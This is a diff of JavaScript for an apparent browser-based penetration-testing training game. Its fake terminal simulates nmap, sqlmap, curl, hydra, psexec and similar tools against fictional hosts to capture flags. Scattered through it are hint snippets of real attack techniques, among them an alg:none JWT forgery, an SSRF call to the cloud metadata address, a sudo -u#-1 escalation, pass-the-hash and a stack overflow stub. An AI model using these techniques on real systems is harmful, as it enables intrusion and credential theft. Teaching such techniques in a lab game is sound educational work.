+    tText('AWS/Cloud       — credentials required');
+  } else if(fl.includes('buffer_overflow')){
+    tLine('<span class="g">#include &lt;string.h&gt;</span>');
+    tLine('<span class="f">void vuln(char *in){char buf[64];strcpy(buf,in);}');
+    tLine('<span class="r">// overflow: buf[64], EBP+4 at offset 72</span>');
+    tLine('<span class="f">int main(){char p[512];gets(p);vuln(p);}');
+  } else if(fl.includes('jwt_forge')){
+    tLine('<span class="g">import base64, json</span>');
+    tLine('<span class="f">h={"alg":"none","typ":"JWT"}');
+    tLine('<span class="f">p={"user":"admin","role":"superadmin"}');
+    tLine('<span class="y">token=b64(h)+"."+b64(p)+"."  # alg:none = no signature</span>');
+    tLine('<span class="d"># Need JWT_SECRET from db_dump.txt</span>');
+  } else if(fl.includes('race_condition')){
+    tLine('<span class="g">import threading, requests</span>');
+    tLine('<span class="f">def transfer():</span>');
+    tLine('<span class="f">  requests.post(TARGET+"/transfer",data={"amount":99999})');
+    tLine('<span class="f">threads=[threading.Thread(target=transfer) for _ in range(50)]');
+    tLine('<span class="f">[t.start() for t in threads]');
+  } else if(fl.includes('drupalgeddon')){
+    tLine('<span class="g">import requests, sys</span>');
+    tLine('<span class="f">url=sys.argv[1]+"/node?_format=hal_json"');
+    tLine('<span class="y">payload={"_links":...}  # CVE-2018-7600</span>');
+    tLine('<span class="d"># Needs config.bak from FTP (ftp.shadowlab)</span>');
+  } else {tText('cat: '+f+': No such file or directory','r');}
+  tBlank();
+}
+
+/* nmap */
+function doNmap(a){
+  if(!a){tText('Usage: nmap [opts] <target>','r');return;}
+  var al=a.toLowerCase();
+  tLine('<span class="d">Starting Nmap 7.94 ( https://nmap.org )</span>');
+  setTimeout(function(){
+    if(al.includes('/24')||al.includes('0/24')){
+      tBlank();tText('Scanning 192.168.1.0/24...','d');
+      tText('Host is up: 192.168.1.100 (kali)');
+      for(var i=0;i<=G.unlocked&&i<M.length;i++){
+        if(M[i].ip.startsWith('192.168')||M[i].ip.startsWith('10.')||M[i].ip.startsWith('172.')){
+          tLine('<span class="g">'+M[i].ip+'</span> <span class="d">('+M[i].host+')</span> Up');
+          tText('  '+M[i].ports.split(' ').slice(0,3).join(' '),'d');
+        }
+      }
+      var locked=0;for(var j=G.unlocked+1;j<M.length;j++)locked++;
+      if(locked>0)tText('... ('+locked+' more hosts — unlock by capturing flags)','d');
+      tLine('<span class="d">Nmap done: '+(G.unlocked+2)+' hosts up</span>');
+    } else {
+      var mI=getMachineIdx(al);
+      if(mI<0){tText('Host unreachable. Try: nmap 192.168.1.0/24','r');}
+      else if(!machineUnlocked(mI)){tLine('<span class="lline">[-] '+M[mI].ip+': Host locked — capture previous flag first</span>');}
+      else{
+        tBlank();tText('Host is up (0.00041s latency).');
+        tText('PORT   STATE SERVICE','b');
+        M[mI].ports.split(' ').forEach(function(p){if(p.includes('/'))tText(p.padEnd(20)+' open');});
+        tText('OS: '+M[mI].os);tText('Hint: '+M[mI].vuln,'y');
+        // smtp open relay check
+        if(mI===2&&al.includes('smtp-open-relay')){
+          tLine('<span class="y">|_smtp-open-relay: Server is an OPEN RELAY!</span>');
+          tLine('<span class="y">Exploit: curl smtp://192.168.1.22 --mail-from x@x --mail-rcpt admin@shadowlab</span>');
+        }
+      }
+    }
+    tBlank();
+  },1300);
+}
+
+function doPing(t){
+  if(!t){tText('Usage: ping <host>','r');return;}
+  var mI=getMachineIdx(t.toLowerCase());
+  tLine('<span class="d">PING '+esc(t)+'</span>');
+  setTimeout(function(){
+    if(mI>=0&&machineUnlocked(mI)){tText('64 bytes: ttl=64 time=0.4ms');tText('0% loss','g');}
+    else{tText('Request timeout','r');}
+    tBlank();
+  },500);
+}
+
+function doSSH(a){
+  if(!a){tText('Usage: ssh [user@]host','r');return;}
+  var al=a.toLowerCase();var mI=getMachineIdx(al);
+  setTimeout(function(){
+    if(mI>=0&&!machineUnlocked(mI)){tLine('<span class="lline">[-] Connection refused (locked)</span>');tBlank();return;}
+    if(al.includes('10.10.0.20')||al.includes('prod-server')){
+      if(!hasLoot('ssh_prod_key')){tText('[!] Need SSH key from jenkins_loot.txt first','r');tHint('Run: cat jenkins_loot.txt');tBlank();return;}
+      tText('deploy@prod-server:~$ sudo -V','f');tText('Sudo version 1.8.31 (vulnerable to baron samedit)','y');
+      tText('deploy@prod-server:~$ sudo -u#-1 /bin/bash','f');
+      setTimeout(function(){tText('root@prod-server:~# id','f');tText('uid=0(root) gid=0(root)','g');captureFlag('FLAG{Pr0d_Sudd0_3scal4t10n}');discoverLoot('ssh_prod_key');discoverLoot('prod_db_pass');tBlank();},1200);
+    } else if(al.includes('10.10.0.30')||al.includes('mainframe')){
+      tText('Connected to 10.10.0.30... use telnet for z/OS','y');
+    } else if(al.includes('192.168.1.16')||al.includes('shadow-vault')){
+      if(!hasLoot('redis_token')){tText('[!] Need Redis token. Check mongo_dump.txt','r');tBlank();return;}
+      tText('vault@shadow-vault:~# ls','f');tText('buffer_overflow.c  flag.txt  service_1337','c');
+    } else {tText('Connection refused','r');}
+    tBlank();
+  },800);
+}
+
+function doFTP(host){
+  if(!host){tText('Usage: ftp <host>','r');return;}
+  var al=host.toLowerCase();var mI=getMachineIdx(al);
+  if(mI>=0&&!machineUnlocked(mI)){tLine('<span class="lline">[-] FTP host locked</span>');return;}
+  tText('Connected to '+host,'g');tText('220 FTP server ready');
+  setTimeout(function(){
+    if(al.includes('192.168.1.20')||al.includes('ftp.shadow')){
+      tText('Name: anonymous','d');tText('230 Login successful (anonymous)','g');
+      tText('ftp> ls /pub/backup/');tText('config.bak  passwords.txt.enc','c');
+      tText('ftp> get config.bak','d');tText('[+] config.bak saved to /root/','g');
+      discoverLoot('ftp_config_pass');
+      captureFlag('FLAG{AnonymOU5_FTP_0wn3d}');
+    } else {tText('530 Login incorrect','r');}
+    tBlank();
+  },1200);
+}
+
+function doTelnet(a){
+  var al=a.toLowerCase();var mI=getMachineIdx(al);
+  if(mI>=0&&!machineUnlocked(mI)){tLine('<span class="lline">[-] Host locked</span>');return;}
+  tText('Trying '+a+'...','d');
+  setTimeout(function(){
+    if(al.includes('192.168.1.22')||al.includes('mail')){
+      tText('220 mail.shadowlab ESMTP Postfix','g');
+      tText('[+] Open relay test: accepted spoofed sender','y');
+      tText('[+] Admin inbox accessible','y');
+      discoverLoot('vpn_config');
+      captureFlag('FLAG{Ma1l_0p3n_R3lay}');
+    } else if(al.includes('10.10.0.30')||al.includes('mainframe')){
+      if(!hasLoot('mainframe_pass')){tText('[!] Need mainframe creds first. Check prod_loot.txt','r');tBlank();return;}
+      tText('IBM z/OS -- LOGON','g');tText('Username: IBMUSER','d');tText('Password: (SYS1)','d');
+      setTimeout(function(){tText('$ OMVS -- uid=0','g');tText('[+] Submitting JCL job...','d');captureFlag('FLAG{M41nfr4m3_B4ckd00r}');discoverLoot('dc_ntlm');tBlank();},1200);
+    } else {tText('telnet: connection refused','r');}
+    tBlank();
+  },900);
+}
+
+function doCurl(a){
+  if(!a){tText('Usage: curl [opts] <url>','r');return;}
+  var al=a.toLowerCase();var mI=getMachineIdx(al);
+  if(mI>0&&!machineUnlocked(mI)){tLine('<span class="lline">[-] Host locked or not yet reachable</span>');return;}
+  addProxy('GET',a,200);tLine('<span class="d">* Connecting: '+esc(a.split(' ').pop())+'</span>');
+  setTimeout(function(){
+    /* --- LFI WordPress --- */
+    if((al.includes('192.168.1.13')||al.includes('wp-blog'))&&(al.includes('../')||al.includes('wp-config'))){
+      tText('< HTTP/1.1 200 OK','g');tLine("<span class=\"y\">define('DB_PASSWORD', 'S3cur3_WP_P4ss!');</span>");
+      tLine("<span class=\"y\">define('DB_USER', 'wp_admin');</span>");
+      discoverLoot('wp_db_pass');captureFlag('FLAG{LFI_W0rdPr3ss_Conf1g_L34k}');
+    }
+    /* --- Admin bypass --- */
+    else if(al.includes('admin-portal')&&al.includes('debug=true')){tText('< HTTP/1.1 200 OK (redirect dropped)','g');tText('[Admin panel accessed]','y');}
+    /* --- SSRF --- */
+    else if(al.includes('169.254.169.254')){
+      var intI=getMachineIdx('10.10.0.5');
+      if(intI>=0&&!hasLoot('drupal_db_pass')){tText('[!] Need Drupal RCE first to reach internal network','r');tBlank();return;}
+      tText('< HTTP/1.1 200 OK (via SSRF)','g');tText('IMDSv1 metadata:','y');
+      tText('  iam/security-credentials/shadowcorp-role','y');
+      tText('  AccessKeyId: AKIA_SHADOW_KEY','y');tText('  SecretKey: xK9m_shadow_secret','y');
+      discoverLoot('aws_key');discoverLoot('aws_secret');captureFlag('FLAG{SSRF_1nt3rn4l_0wn3d}');
+    }
+    /* --- NoSQL bypass --- */
+    else if((al.includes('192.168.1.15')||al.includes('db-server'))&&al.includes('ne')){
+      if(!hasLoot('mongo_pass')){tText('[!] Need MongoDB creds from vb_dump.txt first','r');tHint('cat vb_dump.txt — then use connection string');tBlank();return;}
+      tText('< HTTP/1.1 200 OK','g');tLine('<span class="y">[{"username":"admin","password":"Adm1n_P@ss_L34k3d"}]</span>');
+      tLine('<span class="y">[{"username":"vault_svc","redis_token":"redis_t0k3n_h3r3"}]</span>');
+      discoverLoot('redis_token');discoverLoot('vault_root');captureFlag('FLAG{N0SQL_1nj3ct10n_W1n}');
+    }
+    /* --- SMTP open relay --- */
+    else if(al.includes('smtp://')||al.includes('mail.shadowlab')){
+      tText('< 220 mail.shadowlab ESMTP','g');tText('[+] Open relay: MAIL FROM spoofing accepted','y');
+      tText('[+] Inbox dump saved','y');discoverLoot('vpn_config');captureFlag('FLAG{Ma1l_0p3n_R3lay}');
+    }
+    /* --- Jenkins RCE --- */
+    else if((al.includes('10.10.0.12')||al.includes('jenkins'))&&al.includes('script')){
+      if(!hasLoot('drupal_db_pass')){tText('[!] Need pivot via Drupal shell (10.10.0.0/24 unreachable)','r');tBlank();return;}
+      tText('< HTTP/1.1 200 OK','g');tText('uid=jenkins','y');discoverLoot('ssh_prod_key');captureFlag('FLAG{J3nk1ns_Scr1pt_RC3}');
+    }
+    /* --- Palo Alto 0day --- */
+    else if(al.includes('10.99.0.1')||al.includes('paloalto')||al.includes('ssl-vpn')){
+      if(!hasLoot('vpn_config')){tText('[!] Need VPN access first to reach 10.99.0.0/24','r');tBlank();return;}
+      if(!hasLoot('plc_access')){tText('[!] Need switch_config.txt first (routing to 10.99.0.0)','r');tBlank();return;}
+      tText('< HTTP/1.1 200 OK','g');tText('CVE-2024-3400: OS command injection via session ID','y');
+      tText('uid=root@paloalto','y');discoverLoot('palo_session');captureFlag('FLAG{P4l0_4lt0_CVE_2024_3400}');
+    }
+    /* --- Veeam --- */
+    else if(al.includes('10.10.0.60')||al.includes('backup-srv')||al.includes('veeam')){
+      if(!hasLoot('dc_ntlm')){tText('[!] Need domain compromise first','r');tBlank();return;}
+      tText('< HTTP/1.1 200 OK CVE-2023-27532','g');tLine('<span class="y">backup_svc:Backupp@ss! | domain_backup:D0m@inB4ck!</span>');
+      discoverLoot('veeam_pass');captureFlag('FLAG{V33m_Cr3d_Dump}');
+    }
+    /* --- Drupalgeddon --- */
+    else if(al.includes('192.168.1.21')||al.includes('cms.shadowlab')){
+      if(!hasLoot('ftp_config_pass')){tText('[!] Need config.bak from FTP server first','r');tHint('ftp 192.168.1.20 -> get config.bak -> cat config.bak');tBlank();return;}
+      tText('< HTTP/1.1 200 OK Drupal 8.x','g');tText('CVE-2018-7600 available','y');
+      tText('Run: python3 exploits/drupalgeddon2.py 192.168.1.21','d');
+    }
+    else {
+      var found=getMachineIdx(al);
+      if(found>=0&&machineUnlocked(found)){tText('< HTTP/1.1 200 OK','g');tText('<!DOCTYPE html>...');}
+      else{tText('< HTTP/1.1 200 OK','g');tText('<!DOCTYPE html>...');}
+    }
+    tBlank();
+  },600);
+}
+
+function doWget(a){
+  if(!a){tText('Usage: wget <url>','r');return;}
+  setTimeout(function(){tText('200 OK — saved','g');tBlank();},800);
+}
+
+function doSqlmap(a){
+  if(!a){tText('Usage: sqlmap -u <url> [opts]','r');return;}
+  var al=a.toLowerCase();var mI=getMachineIdx(al);
+  if(mI>0&&!machineUnlocked(mI)){tLine('<span class="lline">[-] Target locked</span>');return;}
+  tLine('<span class="p">        ___  sqlmap 1.8.2</span>');tLine('<span class="d">[*] testing: '+esc(a)+'</span>');
+  setTimeout(function(){
+    /* T1 — SQLi */
+    if(al.includes('192.168.1.10')||al.includes('target1')){
+      if(!al.includes('id=')){tText('[!] No parameters. Try: sqlmap -u "http://192.168.1.10/login.php?id=1" --dbs','y');tBlank();return;}
+      if(al.includes('--dbs')){tText('[+] id: UNION injectable','y');tText('Available databases: information_schema, target_db','g');tText('Next: sqlmap -u "..." -D target_db --tables','d');}
+      else if(al.includes('--tables')){tText('[+] target_db tables: users, orders, config','g');tText('Next: sqlmap -u "..." -T users --dump','d');}
+      else if(al.includes('--dump')){
+        tText('[+] Dumping users...','y');tText('| 1 | john  | $2b$12$LQv3... | user       |');
+        tText('| 2 | admin | $2b$12$EixZ... | superadmin |','y');
+        tText('[+] Config: JWT_SECRET = sh4d0w_s3cr3t_k3y_2024','y');
+        discoverLoot('jwt_secret');captureFlag('FLAG{Un10n_SQLi_M4st3r}');
+      } else {tText('[!] Use --dbs first, then --tables, then --dump','y');}
+    }
+    /* T10 vBulletin blind */
+    else if(al.includes('192.168.1.14')||al.includes('vb-forum')){
+      if(!hasLoot('wp_db_pass')){tText('[!] Need DB password from wp_config.txt first','r');tHint('cat wp_config.txt — password reused on vb-forum');tBlank();return;}
+      if(!al.includes('level')){tText('[!] Time-based blind needs --level=3 --technique=T','y');tBlank();return;}
+      tText('[+] search: time-based blind (MySQL)','y');tText('[*] Extracting... (slow, please wait)','d');
+      setTimeout(function(){
+        tText('[+] vbulletin.user: admin:vBull3t1n!2024','y');
+        tText('[+] web.config: MongoDB conn string','y');
+        discoverLoot('mongo_pass');discoverLoot('vb_admin_pass');captureFlag('FLAG{Bl1nd_T1me_B4sed_SQLi}');tBlank();
+      },3000);
+    }
+    else{tText('[!] No injection found. Check target + parameters.','r');}
+    tBlank();
+  },1800);
+}
+
+function doHydra(a){
+  var al=a.toLowerCase();
+  tLine('<span class="d">[*] hydra '+esc(a)+'</span>');
+  setTimeout(function(){
+    if(al.includes('192.168.1.50')||al.includes('win-ws01')||al.includes('rdp')){
+      if(!hasLoot('win_pass')){tText('[!] Use credentials from email_dump.txt instead of brute-force','y');tHint('cat email_dump.txt');tBlank();return;}
+      tText('[+] admin:W1nd0ws! found','y');tText('Use: rdp 192.168.1.50','d');
+    } else {tText('[!] Brute-force: target not responding','r');}
+    tBlank();
+  },1500);
+}
+
+function doJohn(a){
+  if(!a){tText('Usage: john <hashfile>','r');return;}
+  tText('Loaded hashes...');
+  setTimeout(function(){tText('toor (root)','g');tText('Password123! (admin)','g');tText('Session complete.','d');tBlank();},2000);
+}
+
+function doAircrack(a){
+  var al=a.toLowerCase();
+  var hasCap=G.deskFiles.some(function(f){return f.name==='handshake.cap';});
+  if(!hasCap){tText('[!] No handshake.cap file. Complete vb-forum (M10) first.','r');tBlank();return;}
+  tLine('<span class="b">                   Aircrack-ng 1.7</span>');
+  if(!al.includes('rockyou')&&!al.includes('-w')){tText('[!] Need wordlist: aircrack-ng -w /root/wordlists/rockyou.txt handshake.cap','y');tBlank();return;}
+  tText('[*] Testing 14,344,391 keys...','d');
+  setTimeout(function(){
+    tLine('<span class="g">                   KEY FOUND! [ shadow2024 ]</span>');
+    discoverLoot('vb_admin_pass');captureFlag('FLAG{W1F1_H4ndsh4k3_Cr4ck3d}');tBlank();
+  },2800);
+}
+
+function doGcc(a){
+  var al=a.toLowerCase();
+  if(!al.includes('buffer')){tText('[+] Compiled: ./a.out','g');return;}
+  if(!hasLoot('redis_token')||!hasLoot('vault_root')){
+    tText('[!] Need: 1) Redis token from mongo_dump.txt  2) wifi_key.txt (shadow-vault reachable)','r');
+    tHint('Step 1: NoSQL inject db-server -> get redis_token\nStep 2: aircrack handshake.cap -> get wifi_key.txt\nStep 3: gcc buffer_overflow.c');
+    return;
+  }
+  tText('warning: gets() is dangerous — buffer overflow at offset 72','y');
+  tText('[+] Compiled: ./a.out','g');tText('[*] Sending payload to 192.168.1.16:1337...','d');
+  setTimeout(function(){tText('[+] EIP overwritten at offset 72','y');tText('[+] ret2libc: uid=0(root)','g');captureFlag('FLAG{Buff3r_0v3rfl0w_M4st3r}');tBlank();},1600);
+}
+
+function doPython(a){
+  var al=a.toLowerCase();
+  setTimeout(function(){
+    if(al.includes('jwt_forge')||al.includes('jwt')){
+      if(!hasLoot('jwt_secret')){tText('[!] Need JWT_SECRET from db_dump.txt (sqlmap target1 first)','r');tBlank();return;}
+      tText('[+] Reading JWT_SECRET: sh4d0w_s3cr3t_k3y_2024','g');
+      tText('[+] Forged: alg:none, role:superadmin','y');
+      tText('[+] Token accepted by target2 /api/admin','g');
+      captureFlag('FLAG{JWT_Alg0r1thm_C0nfus10n}');
+    } else if(al.includes('drupalgeddon2')||al.includes('drupal')){
+      if(!hasLoot('ftp_config_pass')){tText('[!] Need config.bak from FTP first','r');tBlank();return;}
+      tText('[+] Drupalgeddon2 CVE-2018-7600','y');tText('[+] www-data@cms shell obtained','g');
+      tText('[+] settings.php: Drup@l_S3cr3t!','y');
+      discoverLoot('drupal_db_pass');captureFlag('FLAG{Druplg3dd0n_RCE}');
+    } else if(al.includes('race')){
+      if(!hasLoot('vault_root')){tText('[!] Need shadow-vault compromise first','r');tBlank();return;}
+      tText('[*] 50 threads...','d');
+      setTimeout(function(){tText('[+] Race won! +$199998','y');captureFlag('FLAG{R4ce_C0nd1t10n_W1nn3r}');tBlank();},1500);
+    } else if(al.includes('eternalblue')){
+      if(!hasLoot('vpn_config')){tText('[!] Need VPN connection first (172.16.0.0/24 unreachable)','r');tBlank();return;}
+      tText('[+] MS17-010 exploit...','d');
+      setTimeout(function(){tText('[+] SYSTEM@scada-hmi','g');discoverLoot('plc_access');captureFlag('FLAG{SCAD4_Pwn3d_1CS}');tBlank();},1500);
+    } else if(al.includes('gitlab_rce')){
+      if(!hasLoot('dc_ntlm')){tText('[!] Need domain compromise first','r');tBlank();return;}
+      tText('[+] GitLab CVE-2021-22205','y');
+      setTimeout(function(){tText('[+] www-git@gitlab shell','g');captureFlag('FLAG{G1tL4b_RC3_0wn3d}');tBlank();},1200);
+    } else if(al.includes('dcsync')){
+      if(!hasLoot('dc_ntlm')){tText('[!] Need DC NTLM hash first (mainframe or staging loot)','r');tBlank();return;}
+      tText('[*] DCSync via impacket...','d');
+      setTimeout(function(){tText('[+] Administrator NTLM: 8846f7eaee...','y');tText('[+] krbtgt NTLM: 4e9815869d... (Golden Ticket!)','y');captureFlag('FLAG{DCSync_D0m41n_0wn3d}');tBlank();},1400);
+    } else {tText('Executed (no output)','d');}
+    tBlank();
+  },700);
+}
+
+function doPsexec(a){
+  var al=a.toLowerCase();
+  if(al.includes('192.168.1.51')||al.includes('file-srv')){
+    if(!hasLoot('win_ntlm')){tText('[!] Need NTLM hash from ws_hashes.txt (workstation loot)','r');tHint('rdp 192.168.1.50 -> mimikatz -> ws_hashes.txt');return;}
+    tText('[*] PtH: impacket-psexec -hashes :8846f7eaee... Admin@192.168.1.51','d');
+    setTimeout(function(){tText('[+] nt authority\\system on FILE-SRV01','g');discoverLoot('smb_hash');discoverLoot('vpn_config');captureFlag('FLAG{SMB_P4ss_Th3_H4sh}');tBlank();},1300);
+  } else if(al.includes('10.10.0.50')||al.includes('shadow-dc')){
+    if(!hasLoot('dc_ntlm')){tText('[!] Need domain NTLM from mainframe or staging','r');return;}
+    tText('[*] PtH on Domain Controller...','d');
+    setTimeout(function(){tText('[+] Administrator@shadow-dc','g');captureFlag('FLAG{DCSync_D0m41n_0wn3d}');tBlank();},1300);
+  } else {tText('[!] PsExec target not specified correctly','r');}
+}
+
+function doCME(a){
+  var al=a.toLowerCase();
+  tText('[*] crackmapexec '+a,'d');
+  setTimeout(function(){
+    if(al.includes('smb')&&(al.includes('192.168.1.51')||al.includes('file'))){
+      if(!hasLoot('win_ntlm')){tText('[!] Need NTLM hash first','r');return;}
+      tText('[+] 192.168.1.51 (FILE-SRV01) PWN3D','g');discoverLoot('smb_hash');captureFlag('FLAG{SMB_P4ss_Th3_H4sh}');
+    } else {tText('[+] '+a+' -> auth attempt','g');}
+    tBlank();
+  },1100);
+}
+
+function doSNMP(a){
+  var al=a.toLowerCase();var mI=getMachineIdx(al);
+  if(mI>=0&&!machineUnlocked(mI)){tLine('<span class="lline">[-] Target locked</span>');return;}
+  tText('[*] snmpwalk -c public '+a,'d');
+  setTimeout(function(){
+    if(al.includes('10.10.2.5')||al.includes('core-sw')||al.includes('switch')){
+      if(!hasLoot('vpn_config')){tText('[!] Need VPN access to reach 10.10.2.0/24','r');tBlank();return;}
+      tText('[+] sysDescr: Cisco IOS 15.x','y');tText('[+] CVE-2023-20198: priv escalation','y');
+      tText('[+] full running-config extracted','g');discoverLoot('plc_access');captureFlag('FLAG{C15c0_SW1tch_0wn3d}');
+    } else {tText('[+] SNMP walk: '+a,'g');}
+    tBlank();
+  },1000);
+}
+
+function doVPN(a){
+  if(!hasLoot('vpn_config')){tText('[!] Need VPN credentials. Check smb_loot.txt (file server) or email_dump.txt (mail).','r');tHint('smb_loot.txt has VPN_config.ovpn');return;}
+  tText('[*] openvpn --config VPN_config.ovpn','d');
+  setTimeout(function(){
+    tText('[+] TLS handshake OK','g');tText('[+] VPN connected: 10.10.1.x assigned','g');
+    tText('[+] Routes added: 172.16.0.0/24, 10.10.2.0/24','y');
+    discoverLoot('vpn_config');captureFlag('FLAG{VPN_G4t3w4y_0wn3d}');tBlank();
+  },1200);
+}
+
+function doAWS(a){
+  var al=a.toLowerCase();
+  if(!hasLoot('aws_key')||!hasLoot('aws_secret')){
+    tText('[!] Need AWS keys from aws_keys.txt (SSRF exploit first)','r');
+    tHint('SSRF: curl "http://10.10.0.5:8080/api/fetch?url=http://169.254.169.254/..."');return;
+  }
+  setTimeout(function(){
+    if(al.includes('s3 ls')||al.includes('s3://')){
+      tText('[+] Bucket: s3://shadowcorp-backup','y');tText('[+] .env found with secrets!','y');
+      captureFlag('FLAG{S3_Buckl3t_Expos3d}');
+    } else if(al.includes('ec2')||al.includes('iam')){
+      tText('[+] 23 EC2 instances found','y');tText('[+] IAM: shadowcorp-ec2-admin role accessible','y');
+      captureFlag('FLAG{AWS_IMDSv1_1AM_4bus3}');
+    } else if(al.includes('c2')||al.includes('cobaltstrike')||al.includes('185.220')){
+      var c2I=getMachineIdx('185.220.x.x');
+      if(c2I>=0&&!machineUnlocked(c2I)){tText('[!] C2 locked','r');tBlank();return;}
+      tText('[+] Cobalt Strike panel: admin/CobaltStrike!','y');tText('[+] 4 active beacons found','y');
+      captureFlag('FLAG{C2_P4n3l_0wn3d}');
+    } else {tText('aws: '+a,'d');}
+    tBlank();
+  },900);
+}
+
+function doSplunk(a){
+  if(!hasLoot('splunk_pass')){tText('[!] Need DC compromise first to reach SIEM (10.10.0.70)','r');tHint('Compromise DC first, then: splunk login');return;}
+  tText('[*] Splunk Web: admin/changeme','d');
+  setTimeout(function(){tText('[+] Login success!','g');tText('[+] RCE via search: | eval x=system("id") -> uid=splunk','y');captureFlag('FLAG{SPLunk_D3fault_CR3ds}');tBlank();},1000);
+}
+
+function doHSM(a){
+  if(!hasLoot('hsm_pin')){tText('[!] Need Splunk compromise first to discover HSM','r');return;}
+  var al=a.toLowerCase();
+  if(!al.includes('pin')&&!al.includes('export')&&!al.includes('1234')){tText('[!] Authenticate first: hsm pin 1234','y');return;}
+  if(al.includes('pin')){tText('[+] PIN 1234 accepted','g');tText('[*] Run: hsm export to extract keys','d');return;}
+  tText('[+] Exporting key material...','y');
+  setTimeout(function(){tText('[+] code_signing.p12 + ssl_wildcard.pem + encryption_master.key','y');discoverLoot('final_key');captureFlag('FLAG{HSM_K3y_3xtr4ct}');tBlank();},1200);
+}
+
+function doPLC(a){
+  var al=a.toLowerCase();
+  if(!hasLoot('plc_access')){tText('[!] Need SCADA HMI (scada-hmi) access first','r');tHint('Exploit SCADA HMI via EternalBlue -> RDP -> plcsim in RDP terminal');return;}
+  tText('[*] s7comm connect 192.168.100.1:102','d');
+  setTimeout(function(){tText('[+] S7-300 connected (no auth)','y');tText('[+] DB1 read/write confirmed','y');captureFlag('FLAG{PLC_S7_Pr0t0c0l_0wn3d}');tBlank();},900);
+}
+
+function doNC(a){
+  var al=a.toLowerCase();
+  if(al.includes('10.10.0.100')||al.includes('65535')||al.includes('31337')){
+    var fbI=getMachineIdx('10.10.0.100');
+    if(fbI>=0&&!machineUnlocked(fbI)){tLine('<span class="lline">[-] Final boss locked</span>');return;}
+    if(!hasLoot('final_key')){tText('[!] Need encryption_master.key from HSM first','r');tHint('hsm pin 1234 -> hsm export -> get final_key');return;}
+    tText('[*] nc 10.10.0.100 31337','d');tText('[*] Custom backdoor service...','d');
+    setTimeout(function(){
+      tText('[*] Sending encryption_master.key...','d');
+      setTimeout(function(){tText('[+] Key accepted — backdoor unlocked!','y');tText('[+] Kernel rootkit disabled','y');tText('[+] uid=0(root) — FINAL BOSS OWNED!','g');captureFlag('FLAG{Sh4d0w_R00t_F1n4l_B0ss}');tBlank();},1200);
+    },800);
+  } else {tText('nc: '+a+': connection refused','r');}
+}
+
+function doRDP(host){
+  if(!host){
+    tText('Usage: rdp <ip>','r');
+    var rdpList=M.filter(function(m){return m.rdp;}).map(function(m){return m.ip+'('+m.host+')';});
+    tText('RDP machines: '+rdpList.join(', '),'d');return;
+  }
+  var mI=getMachineIdx(host.toLowerCase());
+  if(mI<0){tText('xfreerdp: unknown host '+host,'r');return;}
+  if(!M[mI].rdp){tText(host+': no RDP service','r');return;}
+  if(!machineUnlocked(mI)){tLine('<span class="lline">[-] RDP target locked</span>');return;}
+  // Check requires
+  if(!checkRequires(mI)){
+    tText('[!] Missing prerequisites:','r');
+    M[mI].requires.forEach(function(req){if(!hasLoot(req))tText('  Need: '+req+' (not discovered yet)','y');});
+    tBlank();return;
+  }
+  tText('[*] xfreerdp /v:'+host+' /u:Administrator /cert-ignore','d');
+  setTimeout(function(){openRDP(mI);},700);
+}
+
+function doTargets(){
+  tBlank();tText('  #  IP              HOST                    STATUS','b');tText('  '+'-'.repeat(56),'d');
+  for(var i=0;i<M.length;i++){
+    var m=M[i],cap=!!G.flags[m.flag],unl=machineUnlocked(i);
+    var status=cap?'[OWNED] ':unl?'[OPEN]  ':'[LOCKED]';
+    var cls=cap?'g':unl?'y':'d';
+    var rdpbadge=m.rdp?' <span class="c">[RDP]</span>':'';
+    tLine('  <span class="d">'+String(i+1).padStart(2)+'</span>  <span class="'+cls+'">'+m.ip.padEnd(16)+m.host.padEnd(24)+status+'</span>'+rdpbadge);
+  }
+  tBlank();
+}
+
+/* ═══════════════════════════════════════════════
+   BROWSER
+═══════════════════════════════════════════════ */
+function renderBrowserLinks(){
+  var row=$('bqrow');if(!row)return;row.innerHTML='';
+  var hosts=['target1.local','wp-blog.local','vb-forum.local','db-server.local','ai.local','cms.shadowlab'];
+  hosts.forEach(function(h,i){
+    var mI=getMachineIdx(h.replace('.local','').replace('.shadowlab',''));
+    var unl=mI<0||machineUnlocked(mI);
+    var span=document.createElement('span');
+    span.className='bql'+(unl?'':' lk');span.textContent=h.split('.')[0];
+    if(unl)span.onclick=(function(host){return function(){qnav(host);};})(h);
+    row.appendChild(span);
+  });
+}
+function qnav(h){$('binp').value='http://'+h;navBrowser();}
+function navBrowser(){
+  var url=$('binp').value.trim(),ul=url.toLowerCase(),pg=$('bpage');
+  var mI=getMachineIdx(ul);
+  if(mI>0&&!machineUnlocked(mI)){pg.innerHTML='<div class="lockb">&#128274; '+esc(url)+'<br><br>Target locked.</div>';return;}
+  addProxy('GET',url,200);
+  if(ul.includes('target1')||ul.includes('192.168.1.10')){
+    if(ul.includes('id=2')){
+      pg.innerHTML='<div class="pt">IDOR — Admin Record</div><p style="color:var(--fg2);font-size:10px;margin-bottom:8px;">Bonus finding. Main mission: use sqlmap.</p><pre style="font-size:10px;color:var(--yellow);">{id:2,user:admin,role:superadmin}</pre>';
+    } else {
+      pg.innerHTML='<div class="pt">Employee Portal — target1.local</div>'+
+        '<div class="wb">[!] SQLi in GET /login.php?id=</div>'+
+        '<div style="margin:8px 0;font-size:10px;color:var(--dim);">Terminal:<br><span style="color:var(--yellow);">sqlmap -u "http://192.168.1.10/login.php?id=1" --dbs</span><br><span style="color:var(--dim);">then --tables, then --dump</span></div>'+
+        '<div class="wb">[!] Steps required: --dbs -> --tables -> --dump</div>';
+    }
+  } else if(ul.includes('wp-blog')||ul.includes('192.168.1.13')){
+    if(ul.includes('../')||ul.includes('wp-config')){
+      pg.innerHTML='<div class="pt">&#128274; LFI Success!</div><div class="fb">FLAG{LFI_W0rdPr3ss_Conf1g_L34k}</div><pre style="font-size:10px;color:var(--fg2);">DB_PASSWORD=S3cur3_WP_P4ss!</pre>';
+      discoverLoot('wp_db_pass');captureFlag('FLAG{LFI_W0rdPr3ss_Conf1g_L34k}');
+    } else {
+      pg.innerHTML='<div class="pt">WordPress 5.8</div><div class="wb">[!] LFI via ?file= parameter</div>'+
+        '<button class="bb3" onclick="document.getElementById(\'binp\').value=\'http://wp-blog.local/?file=../../../wp-config.php\';navBrowser()">Try LFI</button>'+
+        '<div style="margin-top:12px;color:var(--dim);font-size:10px;">File Upload RCE:</div>'+
+        '<input type="text" class="bi" id="uf" placeholder="shell.php.jpg" style="margin-top:4px;">'+
+        '<button class="bb3" onclick="doUpload()">Upload</button><div id="upres"></div>';
+    }
+  } else if(ul.includes('vb-forum')||ul.includes('192.168.1.14')){
+    if(!hasLoot('wp_db_pass')){
